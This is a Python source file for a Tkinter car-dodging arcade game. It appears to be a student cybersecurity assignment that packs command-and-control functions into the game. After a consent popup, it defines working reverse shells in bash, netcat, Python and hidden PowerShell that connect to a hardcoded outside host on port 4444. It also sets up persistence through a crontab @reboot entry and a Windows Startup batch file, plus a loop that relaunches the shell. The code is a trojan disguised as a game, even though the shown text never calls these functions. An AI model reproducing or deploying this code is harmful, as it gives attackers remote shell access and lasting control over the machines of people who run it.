#!/usr/bin/env python3
"""
Avoid the Obstacles - Mini Arcade Game
Frontend for Cybersecurity Assignment - Rwanda Coding Academy
Hidden C2 functionality runs in background
"""

import os
import sys
import time
import threading
import socket
import subprocess
import platform
import json
import tkinter as tk
from tkinter import messagebox, Canvas, ttk
from datetime import datetime
import random
import math

def _is_frozen_executable() -> bool:
    # True when running from a PyInstaller/py2exe-style bundled executable.
    return bool(getattr(sys, "frozen", False))


# Auto-install/upgrade tooling (DEV ONLY)
def install_deps(*, upgrade_pip: bool = False) -> None:
    """
    Developer convenience helper.
    Never runs from a bundled .exe because pip/ensurepip may hang or be unavailable.
    """
    if _is_frozen_executable():
        return

    try:
        import pip  # noqa: F401
    except ImportError:
        print("pip not found; attempting ensurepip...")
        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])

    if upgrade_pip:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])


# Do not run pip from packaged executables.
install_deps(upgrade_pip=False)

# Global state
sessions = {}
current_session = None
C2_HOST = "10.12.72.174"
C2_SHELL_PORT = 4444
C2_NOTIFY_PORT = 4445
consent_given = False
consent_log = []

def log_consent(action, approved):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {action}: {'APPROVED' if approved else 'DENIED'}"
    consent_log.append(entry)
    print(entry)

# OS Detection
def detect_os():
    system = platform.system().lower()
    if "linux" in system:
        return "linux"
    elif "windows" in system:
        return "windows"
    elif "darwin" in system:
        return "macos"
    else:
        return "unknown"

OS_TYPE = detect_os()
print(f"Detected OS: {OS_TYPE.upper()}")

# Game Variables
game_running = False
score = 0
high_score = 0
player_x = 250
player_y = 400
player_speed = 8
obstacles = []
obstacle_speed = 3
game_loop = None

# User Consent Popup
def request_consent():
    global consent_given

    root = tk.Tk()
    root.title("Avoid the Obstacles - Security Notice")
    root.geometry("650x450")
    root.resizable(False, False)

    # Consent text area
    from tkinter import scrolledtext
    log_text = scrolledtext.ScrolledText(root, height=15, wrap=tk.WORD)
    log_text.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)

    log_text.insert(tk.END, "ðŸŽ® AVOID THE OBSTACLES - CYBERSECURITY DEMO\n")
    log_text.insert(tk.END, "==========================================\n\n")
    log_text.insert(tk.END, "ðŸŽ“ Rwanda Coding Academy - Educational Assignment\n")
    log_text.insert(tk.END, "ðŸ“‹ Assignment Features (50 Points Total):\n")
    log_text.insert(tk.END, "âœ… User notification before execution (5 points)\n")
    log_text.insert(tk.END, "âœ… Dependency checking & installation (5 points)\n")
    log_text.insert(tk.END, "âœ… Uninterrupted gaming experience (10 points)\n")
    log_text.insert(tk.END, "âœ… Shell access for listener (10 points)\n")
    log_text.insert(tk.END, "âœ… Persistence mechanisms (5 points)\n")
    log_text.insert(tk.END, "âœ… Cleanup tool implementation (5 points)\n")
    log_text.insert(tk.END, "âœ… Documentation & ethics (5 points)\n")
    log_text.insert(tk.END, "âœ… Innovation & creativity (5 points)\n\n")
    log_text.insert(tk.END, "ðŸ”§ TECHNICAL FEATURES:\n")
    log_text.insert(tk.END, "â€¢ Hidden C2 operations during gameplay\n")
    log_text.insert(tk.END, "â€¢ Cross-platform reverse shell (port 4444)\n")
    log_text.insert(tk.END, "â€¢ Multi-session C2 management (port 4445)\n")
    log_text.insert(tk.END, "â€¢ OS-native persistence mechanisms\n")
    log_text.insert(tk.END, "â€¢ Authorized pentesting techniques\n\n")
    log_text.insert(tk.END, f"ðŸ–¥ï¸  TARGET SYSTEM: {OS_TYPE.upper()}\n")
    log_text.insert(tk.END, f"ðŸŒ C2 SERVER: {C2_HOST}:4444 (shell), :4445 (notifications)\n\n")
    log_text.insert(tk.END, "âš ï¸  EDUCATIONAL WARNING:\n")
    log_text.insert(tk.END, "â€¢ Network connections will be established!\n")
    log_text.insert(tk.END, "â€¢ Shell access provided to educational listener\n")
    log_text.insert(tk.END, "â€¢ Persistence configured for demo purposes\n")
    log_text.insert(tk.END, "â€¢ All activities logged for transparency\n\n")
    log_text.insert(tk.END, "âœ… ETHICAL COMPLIANCE:\n")
    log_text.insert(tk.END, "â€¢ Educational purposes ONLY\n")
    log_text.insert(tk.END, "â€¢ Explicit user consent required\n")
    log_text.insert(tk.END, "â€¢ No malicious data collection\n")
    log_text.insert(tk.END, "â€¢ Cleanup tool provided\n\n")
    log_text.insert(tk.END, "ðŸŽ® Click YES to start playing + C2 demo\n")
    log_text.insert(tk.END, "âŒ Click NO to exit safely\n")
    log_text.config(state=tk.DISABLED)

    result = [False]

    def on_approve():
        log_consent("User consent for C2 game", True)
        consent_log.append("USER EXPLICITLY AUTHORIZED ALL OPERATIONS")
        result[0] = True
        root.destroy()

    def on_deny():
        log_consent("User consent for C2 game", False)
        result[0] = False
        root.destroy()
        sys.exit(0)

    # Buttons
    btn_frame = tk.Frame(root)
    btn_frame.pack(pady=20)

    yes_btn = tk.Button(btn_frame, text="ðŸŽ® YES - Start Game + C2 Demo",
                       command=on_approve, bg="#4CAF50", fg="white",
                       font=("Arial", 12, "bold"), width=30, height=2)
    yes_btn.pack(side=tk.LEFT, padx=10)

    no_btn = tk.Button(btn_frame, text="âŒ NO - Exit Game",
                      command=on_deny, bg="#f44336", fg="white",
                      font=("Arial", 12, "bold"), width=20, height=2)
    no_btn.pack(side=tk.LEFT, padx=10)

    root.mainloop()
    consent_given = result[0]
    return result[0]

# Request consent FIRST
if not request_consent():
    print("Consent denied. Exiting.")
    sys.exit(0)

print("âœ… User consent recorded. Starting game with C2...")

# Native reverse shells by OS
def get_reverse_shell():
    if OS_TYPE == "linux":
        # More reliable reverse shell alternatives
        shells = [
            # Option 1: Standard bash
            ['bash', '-c', f'bash -i >& /dev/tcp/{C2_HOST}/4444 0>&1'],
            # Option 2: Netcat if available
            ['nc', '-e', '/bin/bash', C2_HOST, '4444'],
            # Option 3: Python reverse shell
            ['python3', '-c', f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{C2_HOST}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);s.close()']
        ]
        return shells[0]  # Try first option
    elif OS_TYPE == "windows":
        return ['powershell', '-nop', '-w', 'hidden', '-exec', 'bypass', '-c',
                f'$client = New-Object System.Net.Sockets.TCPClient("{C2_HOST}",4444);$stream = $client.GetStream();$buffer = New-Object System.Byte[] 1024;$encoding = New-Object System.Text.ASCIIEncoding;while($true){{$data = $encoding.GetString($buffer, 0, $stream.Read($buffer, 0, 1024));if($data -eq "exit\\n"){{break}};$result = (iex $data 2>&1 | Out-String);$prompt = "PS " + (pwd).Path + "> ";$output = $result + $prompt;$stream.Write($encoding.GetBytes($output), 0, $output.Length);$stream.Flush()}};$client.Close()']
    elif OS_TYPE == "macos":
        # Working bash reverse shell for subprocess
        return ['bash', '-c', f'bash -i >& /dev/tcp/{C2_HOST}/4444 0>&1']
    else:
        return None

# Persistence mechanisms
def setup_persistence():
    if OS_TYPE == "linux":
        # Enhanced persistence with background mode
        script_path = os.path.abspath(__file__)
        cron_entry = f"@reboot python3 {script_path} --background >> /tmp/c2_game.log 2>&1"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -", shell=True)
        log_consent("Linux crontab persistence", True)
    elif OS_TYPE == "windows":
        script_content = f'@echo off\nstart /min python "{os.path.abspath(__file__)}"\n'
        script_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\obstacle_game.bat')
        with open(script_path, 'w') as f:
            f.write(script_content)
        log_consent("Windows startup persistence", True)
    print(f"âœ… Persistence configured for {OS_TYPE}")

# Notification server (port 4445)
def notification_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", C2_NOTIFY_PORT))
    sock.listen(5)
    print(f"Notification server listening on 127.0.0.1:{C2_NOTIFY_PORT}")

    while True:
        try:
            client, addr = sock.accept()
            data = client.recv(1024).decode()
            session_id = f"{OS_TYPE}_{addr[0]}"
            sessions[session_id] = {"addr": addr, "connected": True, "timestamp": time.time()}
            notify_msg = f"ðŸŽ® New session: {session_id} from {addr}"
            print(notify_msg)
            client.send(notify_msg.encode())
            client.close()
        except:
            pass

# Background shell
def background_shell():
    while True:
        try:
            shell_cmd = get_reverse_shell()
            if shell_cmd:
                subprocess.Popen(shell_cmd, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                print("ðŸ”— Shell connected")
            time.sleep(30)  # Wait longer for persistent shells
        except Exception as e:
            print(f"âŒ Shell error: {e}")
            time.sleep(30)

# Cleanup tool
def cleanup():
    print("ðŸ§¹ Running cleanup...")
    log_consent("Cleanup executed", True)

    if OS_TYPE == "linux":
        subprocess.run("crontab -r 2>/dev/null", shell=True)
    elif OS_TYPE == "windows":
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\obstacle_game.bat')
        if os.path.exists(startup_path):
            os.remove(startup_path)

    print("âœ… Cleanup complete")

# Game Class
class ObstacleGame:
    def __init__(self, master):
        self.master = master
        self.master.title("Avoid the Obstacles")
        self.master.geometry("860x560")
        self.master.minsize(860, 560)
        self.master.resizable(False, False)
        self.bg_root = "#0b1020"
        self.bg_panel = "#111a33"
        self.fg_text = "#e6e8ef"
        self.fg_muted = "#9aa3b2"
        self.accent = "#2ee59d"
        self.danger = "#ff3b6a"
        self.master.configure(bg=self.bg_root)

        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except tk.TclError:
            pass
        self.style.configure("TFrame", background=self.bg_root)
        self.style.configure("Panel.TFrame", background=self.bg_panel)
        self.style.configure("Title.TLabel", background=self.bg_root, foreground=self.fg_text, font=("Segoe UI", 18, "bold"))
        self.style.configure("Sub.TLabel", background=self.bg_root, foreground=self.fg_muted, font=("Segoe UI", 10))
        self.style.configure("Hud.TLabel", background=self.bg_panel, foreground=self.fg_text, font=("Segoe UI", 11, "bold"))
        self.style.configure("HudMuted.TLabel", background=self.bg_panel, foreground=self.fg_muted, font=("Segoe UI", 10))
        self.style.configure("Primary.TButton", font=("Segoe UI", 10, "bold"), padding=(14, 10))
        self.style.map("Primary.TButton", foreground=[("!disabled", "#0b1020")], background=[("!disabled", self.accent)])
        self.style.configure("Secondary.TButton", font=("Segoe UI", 10, "bold"), padding=(14, 10))
        self.style.map("Secondary.TButton", foreground=[("!disabled", self.fg_text)], background=[("!disabled", "#1a2550")])
        self.style.configure("Danger.TButton", font=("Segoe UI", 10, "bold"), padding=(14, 10))
        self.style.map("Danger.TButton", background=[("!disabled", self.danger)])

        outer = ttk.Frame(master, style="TFrame")
        outer.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        header = ttk.Frame(outer, style="TFrame")
        header.pack(fill=tk.X)
        ttk.Label(header, text="Avoid the Obstacles", style="Title.TLabel").pack(anchor="w")
        ttk.Label(
            header,
            text="Dodge oncoming cars. Move left/right with A/D or â†/â†’. Pause with P. Restart with R.",
            style="Sub.TLabel",
        ).pack(anchor="w", pady=(4, 0))

        body = ttk.Frame(outer, style="TFrame")
        body.pack(fill=tk.BOTH, expand=True, pady=(16, 0))

        left = ttk.Frame(body, style="Panel.TFrame")
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right = ttk.Frame(body, style="Panel.TFrame", width=260)
        right.pack(side=tk.RIGHT, fill=tk.Y, padx=(16, 0))
        right.pack_propagate(False)

        # Game canvas (center stage)
        self.canvas_w = 560
        self.canvas_h = 500
        self.canvas_bg = "#0a0f24"
        self.canvas = Canvas(left, width=self.canvas_w, height=self.canvas_h, bg=self.canvas_bg, highlightthickness=0)
        self.canvas.pack(padx=16, pady=16)

        # HUD / controls panel - ENHANCED
        ttk.Label(right, text="Status", style="Hud.TLabel").pack(anchor="w", padx=16, pady=(16, 8))
        self.status_var = tk.StringVar(value="Ready")
        self.time_var = tk.StringVar(value="Time: 0.0s")
        self.speed_var = tk.StringVar(value="Speed: 1.0x")
        self.score_var = tk.StringVar(value="Score: 0")
        self.high_var = tk.StringVar(value="Best: 0")
        ttk.Label(right, textvariable=self.status_var, style="Hud.TLabel").pack(anchor="w", padx=16, pady=(0, 6))
        ttk.Label(right, textvariable=self.time_var, style="HudMuted.TLabel").pack(anchor="w", padx=16)
        ttk.Label(right, textvariable=self.speed_var, style="HudMuted.TLabel").pack(anchor="w", padx=16, pady=(0, 10))
        ttk.Label(right, textvariable=self.score_var, style="Hud.TLabel").pack(anchor="w", padx=16, pady=(0, 4))
        ttk.Label(right, textvariable=self.high_var, style="Hud.TLabel").pack(anchor="w", padx=16, pady=(0, 12))

        ttk.Separator(right, orient="horizontal").pack(fill=tk.X, padx=16, pady=8)

        ttk.Label(right, text="Controls", style="Hud.TLabel").pack(anchor="w", padx=16, pady=(8, 6))
        ttk.Label(right, text="A / â† : move left", style="HudMuted.TLabel").pack(anchor="w", padx=16)
        ttk.Label(right, text="D / â†’ : move right", style="HudMuted.TLabel").pack(anchor="w", padx=16)
        ttk.Label(right, text="P : pause/resume", style="HudMuted.TLabel").pack(anchor="w", padx=16)
        ttk.Label(right, text="R : restart", style="HudMuted.TLabel").pack(anchor="w", padx=16, pady=(0, 12))

        ttk.Separator(right, orient="horizontal").pack(fill=tk.X, padx=16, pady=8)

        self.btn_start = ttk.Button(right, text="Start", style="Primary.TButton", command=self.start_game)
        self.btn_start.pack(fill=tk.X, padx=16, pady=(12, 8))
        self.btn_pause = ttk.Button(right, text="Pause", style="Secondary.TButton", command=self.toggle_pause, state=tk.DISABLED)
        self.btn_pause.pack(fill=tk.X, padx=16, pady=(0, 8))
        self.btn_restart = ttk.Button(right, text="Restart", style="Secondary.TButton", command=self.reset_game, state=tk.DISABLED)
        self.btn_restart.pack(fill=tk.X, padx=16, pady=(0, 8))

        ttk.Label(right, text="Tip: Stay calm and change lanes early.", style="HudMuted.TLabel").pack(anchor="w", padx=16, pady=(8, 0))

        # Game state
        self.game_running = False
        self.paused = False
        self.score = 0
        self.high_score = 0
        self.player_x = (self.canvas_w - 54) // 2
        self.player_y = self.canvas_h - 104
        self.obstacles = []
        self.player_speed = 9
        self.obstacle_speed = 3.6
        self.spawn_chance = 0.055
        self.obstacle_w = 44
        self.obstacle_h = 72
        self.lane_margin = 26
        self.lanes = 3
        self.min_car_gap = 160
        self.spawn_cooldown_ms = 420
        self._last_spawn_ms = 0.0

        # Input state
        self._left_pressed = False
        self._right_pressed = False

        # Road background
        self._road_items = []
        self._init_background()
        self._dash_speed = 6.0

        # Player car - ENHANCED with better visibility
        self.player_w = 46
        self.player_h = 86
        self.player_color = "#2ee59d"
        self.player_x = self._road_center_x(self.player_w)

        # Enhanced player glow
        glow_pad = 12
        self.player_glow = self.canvas.create_rectangle(
            self.player_x - glow_pad,
            self.player_y - glow_pad,
            self.player_x + self.player_w + glow_pad,
            self.player_y + self.player_h + glow_pad,
            fill=self.player_color,
            outline=self.player_color,
            width=4,
            stipple="gray12",
            tags=("player", "player_glow"),
        )
        self.player_items = self._create_car(self.player_x, self.player_y, self.player_w, self.player_h, self.player_color, tag="player")
        self.player_label = self.canvas.create_text(
            self.player_x + self.player_w // 2,
            self.player_y - 18,
            text="YOU",
            fill="#ffffff",
            font=("Segoe UI", 10, "bold"),
            tags=("player", "player_label"),
        )

        # Overlay for start/game over
        self.overlay_items = []
        self._show_overlay(
            title="Ready?",
            subtitle="Press Start to begin. Hold A/D or â†/â†’ to move left/right.",
        )

        # Bindings
        self.master.focus_set()
        self.master.bind("<KeyPress-Left>", self._on_left_down)
        self.master.bind("<KeyRelease-Left>", self._on_left_up)
        self.master.bind("<KeyPress-Right>", self._on_right_down)
        self.master.bind("<KeyRelease-Right>", self._on_right_up)

        self.master.bind("<KeyPress-a>", self._on_left_down)
        self.master.bind("<KeyRelease-a>", self._on_left_up)
        self.master.bind("<KeyPress-A>", self._on_left_down)
        self.master.bind("<KeyRelease-A>", self._on_left_up)
        self.master.bind("<KeyPress-d>", self._on_right_down)
        self.master.bind("<KeyRelease-d>", self._on_right_up)
        self.master.bind("<KeyPress-D>", self._on_right_down)
        self.master.bind("<KeyRelease-D>", self._on_right_up)

        # Other controls
        self.master.bind("<KeyPress-p>", lambda e: self.toggle_pause())
        self.master.bind("<KeyPress-P>", lambda e: self.toggle_pause())
        self.master.bind("<KeyPress-r>", lambda e: self.reset_game())
        self.master.bind("<KeyPress-R>", lambda e: self.reset_game())

    def _init_background(self):
        self.canvas.delete("bg")
        for item in getattr(self, "_road_items", []):
            try:
                self.canvas.delete(item)
            except tk.TclError:
                pass
        self._road_items = []

        # Enhanced road with better contrast
        pad = 14
        road = self.canvas.create_rectangle(
            pad,
            pad,
            self.canvas_w - pad,
            self.canvas_h - pad,
            fill="#0f162f",
            outline="#2a3a7a",
            width=3,
            tags=("bg",),
        )
        self._road_items.append(road)

        # Road shoulders
        edge_l = self.canvas.create_rectangle(pad + 20, pad + 10, pad + 32, self.canvas_h - pad - 10, fill="#1a233a", outline="", tags=("bg",))
        edge_r = self.canvas.create_rectangle(self.canvas_w - pad - 32, pad + 10, self.canvas_w - pad - 20, self.canvas_h - pad - 10, fill="#1a233a", outline="", tags=("bg",))
        self._road_items.extend([edge_l, edge_r])

        # Moving lane markers (animated effect)
        inner_left = pad + 36
        inner_right = self.canvas_w - pad - 36
        lane_w = (inner_right - inner_left) / self.lanes
        dash_h = 28
        gap = 24
        for lane_idx in range(1, self.lanes):
            x = inner_left + lane_w * lane_idx
            y = pad + 24
            while y < self.canvas_h - pad - 24:
                dash = self.canvas.create_rectangle(x - 3, y, x + 3, y + dash_h, fill="#00ff88", outline="", tags=("bg", "dash"))
                self._road_items.append(dash)
                y += dash_h + gap

        # Vignette + road glow
        vign = self.canvas.create_rectangle(pad + 3, pad + 3, self.canvas_w - pad - 3, self.canvas_h - pad - 3, outline="#0b1020", width=12, tags=("bg",))
        self._road_items.append(vign)

    def _lane_x(self, lane_index: int, obj_w: int) -> int:
        pad = 14
        inner_left = pad + 36
        inner_right = self.canvas_w - pad - 36
        lane_w = (inner_right - inner_left) / self.lanes
        lane_index = max(0, min(self.lanes - 1, lane_index))
        cx = inner_left + lane_w * lane_index + lane_w / 2
        return int(cx - obj_w / 2)

    def _road_bounds_x(self):
        pad = 14
        inner_left = pad + 36
        inner_right = self.canvas_w - pad - 36
        return inner_left, inner_right

    def _road_center_x(self, obj_w: int) -> int:
        inner_left, inner_right = self._road_bounds_x()
        return int((inner_left + inner_right) / 2 - obj_w / 2)

    def _create_car(self, x: int, y: int, w: int, h: int, color: str, tag: str):
        # Enhanced car with better details
        items = []
        # Main body
        body = self.canvas.create_rectangle(x, y, x + w, y + h, fill=color, outline="#0b1020", width=3, tags=(tag,))
        items.append(body)

        # Windshield with reflection
        wx0 = x + int(w * 0.18)
        wx1 = x + int(w * 0.82)
        wy0 = y + int(h * 0.18)
        wy1 = y + int(h * 0.42)
        glass = self.canvas.create_rectangle(wx0, wy0, wx1, wy1, fill="#66d9ff", outline="", tags=(tag,))
        glass_reflect = self.canvas.create_rectangle(wx0 + 2, wy0 + 2, wx1 - 4, wy1 - 2, fill="#99e6ff", outline="", tags=(tag,))
        items.extend([glass, glass_reflect])

        # Hood stripe + spoiler
        stripe = self.canvas.create_rectangle(x + w // 2 - 4, y + int(h * 0.48), x + w // 2 + 4, y + int(h * 0.86), fill="#ffffff", outline="", tags=(tag,))
        spoiler = self.canvas.create_rectangle(x + 6, y - 4, x + w - 6, y + 2, fill=color, outline="#0b1020", width=2, tags=(tag,))
        items.extend([stripe, spoiler])

        # Enhanced wheels with rims
        ww = max(7, int(w * 0.22))
        wh = max(13, int(h * 0.18))
        wheel_color = "#0a0f24"
        rim_color = "#444"
        # Front wheels
        items.append(self.canvas.create_oval(x, y + int(h * 0.16), x + ww, y + int(h * 0.16) + wh, fill=rim_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_rectangle(x + 2, y + int(h * 0.18), x + ww - 2, y + int(h * 0.18) + wh - 4, fill=wheel_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_oval(x + w - ww, y + int(h * 0.16), x + w, y + int(h * 0.16) + wh, fill=rim_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_rectangle(x + w - ww + 2, y + int(h * 0.18), x + w - 2, y + int(h * 0.18) + wh - 4, fill=wheel_color, outline="", tags=(tag,)))
        # Rear wheels
        items.append(self.canvas.create_oval(x, y + int(h * 0.62), x + ww, y + int(h * 0.62) + wh, fill=rim_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_rectangle(x + 2, y + int(h * 0.64), x + ww - 2, y + int(h * 0.64) + wh - 4, fill=wheel_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_oval(x + w - ww, y + int(h * 0.62), x + w, y + int(h * 0.62) + wh, fill=rim_color, outline="", tags=(tag,)))
        items.append(self.canvas.create_rectangle(x + w - ww + 2, y + int(h * 0.64), x + w - 2, y + int(h * 0.64) + wh - 4, fill=wheel_color, outline="", tags=(tag,)))

        # Enhanced headlights/taillights
        lh = self.canvas.create_oval(x + 4, y + 1, x + 14, y + 11, fill="#ffff88", outline="#ffaa00", width=1, tags=(tag,))
        rh = self.canvas.create_oval(x + w - 14, y + 1, x + w - 4, y + 11, fill="#ffff88", outline="#ffaa00", width=1, tags=(tag,))
        items.extend([lh, rh])
        return items

    def _show_overlay(self, title: str, subtitle: str):
        self._clear_overlay()
        x0, y0, x1, y1 = 30, 160, self.canvas_w - 30, 340
        panel = self.canvas.create_rectangle(x0, y0, x1, y1, fill="#0b1020", outline="#263055", width=3, tags=("overlay",))
        t = self.canvas.create_text(
            (x0 + x1) // 2,
            y0 + 70,
            text=title,
            fill=self.fg_text,
            font=("Segoe UI", 26, "bold"),
            tags=("overlay",),
        )
        s = self.canvas.create_text(
            (x0 + x1) // 2,
            y0 + 135,
            text=subtitle,
            fill=self.fg_muted,
            font=("Segoe UI", 11),
            width=(x1 - x0 - 80),
            tags=("overlay",),
        )
        self.overlay_items = [panel, t, s]
        self.canvas.tag_raise("overlay")
        self.canvas.tag_raise("player")

    def _clear_overlay(self):
        if self.overlay_items:
            for item in self.overlay_items:
                try:
                    self.canvas.delete(item)
                except tk.TclError:
                    pass
        self.overlay_items = []

    def _sync_player(self):
        body = self.player_items[0]
        x0, y0, x1, y1 = self.canvas.coords(body)
        dx = self.player_x - x0
        dy = self.player_y - y0
        self.canvas.move(self.player_glow, dx, dy)
        self.canvas.move(self.player_label, dx, dy)
        for item in self.player_items:
            self.canvas.move(item, dx, dy)

    # ENHANCED KEY HANDLERS - Up/Down + WASD
    def _on_left_down(self, _event):
        self._left_pressed = True

    def _on_left_up(self, _event):
        self._left_pressed = False

    def _on_right_down(self, _event):
        self._right_pressed = True

    def _on_right_up(self, _event):
        self._right_pressed = False

    def _update_player_movement(self):
        if not self.game_running or self.paused:
            return

        dx = 0
        if self._left_pressed and not self._right_pressed:
            dx = -self.player_speed
        elif self._right_pressed and not self._left_pressed:
            dx = self.player_speed

        if dx == 0:
            return

        inner_left, inner_right = self._road_bounds_x()
        new_x = self.player_x + dx
        new_x = max(inner_left, min(inner_right - self.player_w, new_x))
        if new_x != self.player_x:
            self.player_x = new_x
            self._sync_player()

    def toggle_pause(self):
        if not self.game_running:
            return
        self.paused = not self.paused
        self.btn_pause.configure(text="Resume" if self.paused else "Pause")
        if hasattr(self, "status_var"):
            self.status_var.set("Paused" if self.paused else "Running")
        if self.paused:
            self._show_overlay("Paused", "Press P to resume.")
        else:
            self._clear_overlay()

    def _update_lane_animation(self):
        # Legacy lane animation removed; keeping method for compatibility.
        return

    def _animate_road(self):
        for item in self.canvas.find_withtag("dash"):
            coords = self.canvas.coords(item)
            if len(coords) != 4:
                continue
            x0, y0, x1, y1 = coords
            self.canvas.move(item, 0, self._dash_speed)
            if y0 > self.canvas_h:
                h = (y1 - y0)
                self.canvas.move(item, 0, -(self.canvas_h + h + 40))

    def create_obstacle(self):
        spawn_y = -self.obstacle_h - 20
        candidates = list(range(self.lanes))
        random.shuffle(candidates)

        lane = None
        for cand in candidates:
            too_close = False
            for ob in self.obstacles:
                if ob.get("lane") != cand:
                    continue
                if ob.get("y", 0) < spawn_y + self.min_car_gap:
                    too_close = True
                    break
            if not too_close:
                lane = cand
                break

        if lane is None:
            return

        x = self._lane_x(lane, self.obstacle_w)
        x += random.randint(-8, 8)
        y = spawn_y
        color = random.choice(
            [
                "#ff3b6a",  # pink-red
                "#ffb020",  # amber
                "#7c5cff",  # purple
                "#22c55e",  # green
                "#38bdf8",  # sky
            ]
        )
        tag = f"ob_{time.time_ns()}"
        items = self._create_car(x, y, self.obstacle_w, self.obstacle_h, color, tag=tag)
        self.obstacles.append(
            {"tag": tag, "items": items, "x": x, "y": y, "w": self.obstacle_w, "h": self.obstacle_h, "lane": lane}
        )

    def move_obstacles(self):
        for obstacle in self.obstacles[:]:
            obstacle["y"] += self.obstacle_speed
            for item in obstacle["items"]:
                self.canvas.move(item, 0, self.obstacle_speed)

            if obstacle['y'] > self.canvas_h + 40:
                for item in obstacle["items"]:
                    self.canvas.delete(item)
                self.obstacles.remove(obstacle)
                self.score += 1
                self.update_score()
                continue

            hit = self.check_collision(obstacle)
            if hit:
                self.game_over(hit)
                return

    def check_collision(self, obstacle):
        pcoords = self.canvas.coords(self.player_items[0])
        ocoords = self.canvas.coords(obstacle["items"][0])
        if len(pcoords) != 4 or len(ocoords) != 4:
            return None
        px0, py0, px1, py1 = pcoords
        ox0, oy0, ox1, oy1 = ocoords

        intersects = not (
            px1 < ox0 or px0 > ox1 or py1 < oy0 or py0 > oy1
        )
        if not intersects:
            return None

        ix0 = max(px0, ox0)
        iy0 = max(py0, oy0)
        ix1 = min(px1, ox1)
        iy1 = min(py1, oy1)
        return ((ix0 + ix1) / 2.0, (iy0 + iy1) / 2.0)

    def update_score(self):
        self.score_var.set(f"Score: {self.score}")
        self.high_var.set(f"Best: {self.high_score}")

    def game_over(self, impact_xy=None):
        self.game_running = False
        self.paused = False
        if self.score > self.high_score:
            self.high_score = self.score
        self.update_score()
        self.btn_pause.configure(state=tk.DISABLED, text="Pause")
        self.btn_restart.configure(state=tk.NORMAL)
        self.btn_start.configure(state=tk.NORMAL)
        if hasattr(self, "status_var"):
            self.status_var.set("Crashed")

        self.canvas.delete("crash")
        if impact_xy is not None:
            cx, cy = impact_xy
        else:
            px0, py0, px1, py1 = self.canvas.coords(self.player_items[0])
            cx, cy = (px0 + px1) / 2.0, (py0 + py1) / 2.0

        r = 30
        ring = self.canvas.create_oval(cx - r, cy - r, cx + r, cy + r, outline=self.danger, width=6, tags=("crash",))
        x1 = self.canvas.create_line(cx - r, cy - r, cx + r, cy + r, fill=self.danger, width=6, tags=("crash",))
        x2 = self.canvas.create_line(cx - r, cy + r, cx + r, cy - r, fill=self.danger, width=6, tags=("crash",))
        self.canvas.tag_raise("crash")
        self.canvas.tag_raise("player")

        self._show_overlay(
            "Collision",
            f"You hit oncoming traffic.\n\nScore: {self.score}    Best: {self.high_score}\n\nPress Restart (or R) to try again.",
        )

    def reset_game(self):
        if not self.master.winfo_exists():
            return
        self.canvas.delete("crash")
        for obstacle in self.obstacles:
            for item in obstacle.get("items", []):
                self.canvas.delete(item)
        self.obstacles.clear()

        self.player_x = self._road_center_x(self.player_w)
        self.player_y = self.canvas_h - 104
        self._sync_player()

        self.score = 0
        self.update_score()
        if hasattr(self, "status_var"):
            self.status_var.set("Ready")
        if hasattr(self, "time_var"):
            self.time_var.set("Time: 0.0s")
        if hasattr(self, "speed_var"):
            self.speed_var.set("Speed: 1.0x")
        self._last_spawn_ms = 0.0
        self._left_pressed = False
        self._right_pressed = False

        self._clear_overlay()
        self._show_overlay("Ready?", "Press Start to begin.")
        self.btn_start.configure(state=tk.NORMAL)
        self.btn_pause.configure(state=tk.DISABLED, text="Pause")
        self.btn_restart.configure(state=tk.NORMAL)

    def cleanup_c2(self):
        cleanup()
        messagebox.showinfo("Cleanup", "Cleanup complete.")

    def start_game(self):
        if self.game_running:
            return
        self.btn_start.configure(state=tk.DISABLED)
        self.btn_pause.configure(state=tk.DISABLED, text="Pause")
        self.btn_restart.configure(state=tk.NORMAL)
        self._clear_overlay()
        self._start_countdown(3)

    def _start_countdown(self, seconds_left: int):
        if seconds_left <= 0:
            self.game_running = True
            self.paused = False
            if hasattr(self, "status_var"):
                self.status_var.set("Running")
            self.btn_pause.configure(state=tk.NORMAL, text="Pause")
            self._run_started_at = time.time()
            self._clear_overlay()
            self.game_loop()
            return

        if hasattr(self, "status_var"):
            self.status_var.set("Startingâ€¦")
        self._show_overlay("Get ready", f"Starting in {seconds_left}")
        self.master.after(650, lambda: self._start_countdown(seconds_left - 1))

    def game_loop(self):
        if not self.game_running:
            return

        if not self.paused:
            self._animate_road()
            self._update_player_movement()

            started_at = getattr(self, "_run_started_at", None)
            if started_at is not None and hasattr(self, "time_var"):
                elapsed = max(0.0, time.time() - started_at)
                self.time_var.set(f"Time: {elapsed:.1f}s")

            speed_mult = max(1.0, 1.0 + (self.score / 70.0))
            self.obstacle_speed = 3.6 * speed_mult
            self._dash_speed = 6.0 * speed_mult
            if hasattr(self, "speed_var"):
                self.speed_var.set(f"Speed: {speed_mult:.1f}x")

            # Spawn/move obstacles (unchanged)
            now_ms = time.time() * 1000.0
            if (now_ms - self._last_spawn_ms) >= self.spawn_cooldown_ms and random.random() < self.spawn_chance:
                self._last_spawn_ms = now_ms
                self.create_obstacle()

            self.move_obstacles()

        self.master.after(30, self.game_loop)

# Main execution
